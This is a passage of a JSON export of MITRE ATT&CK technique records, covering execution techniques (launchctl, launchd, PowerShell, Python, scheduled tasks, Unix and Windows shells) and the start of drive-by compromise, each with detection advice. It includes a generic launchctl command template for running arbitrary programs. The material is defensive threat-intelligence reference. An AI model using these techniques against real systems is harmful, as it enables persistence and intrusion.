of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":632,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":632,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":632,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":647,"name":"T1569.001 - Launchctl","sort_id":0,"external_id":"T1569.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/001\">Launch Agent<\/a>s and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a>s, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)<\/p>\n<p>By loading or reloading <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/001\">Launch Agent<\/a>s or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a>s, adversaries can install persistence or execute changes they made.(Citation: Sofacy Komplex Trojan)<\/p>\n<p>Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- \/Path\/to\/thing\/to\/execute &quot;arg&quot; &quot;arg&quot; &quot;arg&quot;<\/code>. Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"KnockKnock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk which can be monitored. Monitor process execution from launchctl\/launchd for unusual or unknown processes.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":647,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":648,"name":"T1053.004 - Launchd","sort_id":0,"external_id":"T1053.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the <code>Launchd<\/code> daemon to perform task scheduling for initial or recurring execution of malicious code. The <code>launchd<\/code> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>\/System\/Library\/LaunchDaemons<\/code> and <code>\/Library\/LaunchDaemons<\/code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).<\/p>\n<p>An adversary may use the <code>launchd<\/code> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <code>launchd<\/code> can also be abused to run a process under the context of a specified account. Daemons, such as <code>launchd<\/code>, run with the permissions of the root user account, and will operate regardless of which user account is logged in.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":648,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":661,"name":"T1204.002 - Malicious File","sort_id":0,"external_id":"T1204.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/001\">Spearphishing Attachment<\/a>. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.<\/p>\n<p>Adversaries may employ various forms of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> on the file to increase the likelihood that a user will open it.<\/p>\n<p>While <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\/002\">Malicious File<\/a> frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after <a href=\"https:\/\/attack.mitre.org\/techniques\/T1534\">Internal Spearphishing<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate\/Decode Files or Information](https:\/\/attack.mitre.org\/techniques\/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":661,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":661,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":661,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":662,"name":"T1204.001 - Malicious Link","sort_id":0,"external_id":"T1204.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/002\">Spearphishing Link<\/a>. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1203\">Exploitation for Client Execution<\/a>. Links may also lead users to download files that require execution via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\/002\">Malicious File<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":662,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":662,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":662,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":702,"name":"T1059.001 - PowerShell","sort_id":0,"external_id":"T1059.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process<\/code> cmdlet which can be used to run an executable and the <code>Invoke-Command<\/code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).<\/p>\n<p>PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.<\/p>\n<p>A number of PowerShell-based offensive testing tools are available, including <a href=\"https:\/\/attack.mitre.org\/software\/S0363\">Empire<\/a>,  <a href=\"https:\/\/attack.mitre.org\/software\/S0194\">PowerSploit<\/a>, <a href=\"https:\/\/attack.mitre.org\/software\/S0378\">PoshC2<\/a>, and PSAttack.(Citation: Github PSAttack)<\/p>\n<p>PowerShell commands\/scripts can also be executed without directly invoking the <code>powershell.exe<\/code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation<\/code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and\/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names\/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":702,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":714,"name":"T1059.006 - Python","sort_id":0,"external_id":"T1059.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting\/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe<\/code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.<\/p>\n<p>Python comes with many built-in packages to interact with the underlying system, such as file operations and device I\/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":714,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":714,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":714,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":739,"name":"T1053.005 - Scheduled Task","sort_id":0,"external_id":"T1053.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks<\/code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.<\/p>\n<p>The deprecated <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> utility could also be abused by adversaries (ex: <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\/002\">At (Windows)<\/a>), though <code>at.exe<\/code> can not access tasks created with <code>schtasks<\/code> or the Control Panel.<\/p>\n<p>An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process execution from the <code>svchost.exe<\/code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe<\/code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler\/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 \/ 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 \/ 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":739,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":745,"name":"T1569.002 - Service Execution","sort_id":0,"external_id":"T1569.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe<\/code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe<\/code> and <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a>.<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/software\/S0029\">PsExec<\/a> can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)<\/p>\n<p>Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/003\">Windows Service<\/a> during service persistence or privilege escalation.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https:\/\/attack.mitre.org\/software\/S0029).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":745,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":769,"name":"T1569 - System Services","sort_id":0,"external_id":"T1569","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence (<a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\">Create or Modify System Process<\/a>), but adversaries can also abuse services for one-time or temporary execution.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for command line invocations of tools capable of modifying services that doesn\u2019t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":769,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":769,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":780,"name":"T1059.004 - Unix Shell","sort_id":0,"external_id":"T1059.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.<\/p>\n<p>Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.<\/p>\n<p>Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/004\">SSH<\/a>. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":780,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":780,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":786,"name":"T1059.005 - Visual Basic","sort_id":0,"external_id":"T1059.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> and the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1106\">Native API<\/a> through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)<\/p>\n<p>Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Office applications.(Citation: Microsoft VBA)  VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/007\">JavaScript\/JScript<\/a> on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)<\/p>\n<p>Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/001\">Spearphishing Attachment<\/a> payloads.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https:\/\/attack.mitre.org\/tactics\/TA0007), [Collection](https:\/\/attack.mitre.org\/tactics\/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":786,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":786,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":786,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":791,"name":"T1059.003 - Windows Command Shell","sort_id":0,"external_id":"T1059.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the Windows command shell for execution. The Windows command shell (<code>cmd.exe<\/code>) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. <\/p>\n<p>Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.<\/p>\n<p>Adversaries may leverage <code>cmd.exe<\/code> to execute various commands and payloads. Common uses include <code>cmd.exe \/c<\/code> to execute a single command, or abusing <code>cmd.exe<\/code> interactively with input and output forwarded over a command and control channel.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":791,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]}]},{"id":24,"name":"Initial Access","source_name":"ENTERPRISE_initial-access","sort_id":0,"external_id":"TA0001","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":16,"tactic_id":24},"techniques":[{"id":225,"name":"T1189 - Drive-by Compromise","sort_id":0,"external_id":"T1189","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\/001\">Application Access Token<\/a>.<\/p>\n<p>Multiple ways of delivering exploit code to a browser exist, including:<\/p>\n<ul>\n<li>A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.<\/li>\n<li>Malicious ads are paid for and served through legitimate ad providers.<\/li>\n<li>Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).<\/li>\n<\/ul>\n<p>Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)<\/p>\n<p>Typical drive-by compromise process:<\/p>\n<ol>\n<li>A user visits a website that is used to host the adversary controlled content.<\/li>\n<li>Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n<ul>\n<li>The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.<\/li>\n<\/ul><\/li>\n<li>Upon finding a vulnerable version, exploit code is delivered to the browser.<\/li>\n<li>If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n<ul>\n<li>In some cases a second visit to the website after the initial scan is required before exploit code is delivered.<\/li>\n<\/ul><\/li>\n<\/ol>\n<p>Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1190\">Exploit Public-Facing Application<\/a>, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.<\/p>\n<p>Adversaries may also use compromised websites to deliver a user to a malicious application designed to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1528\">Steal Application Access Token<\/a>s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL\/TLS MITM inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on 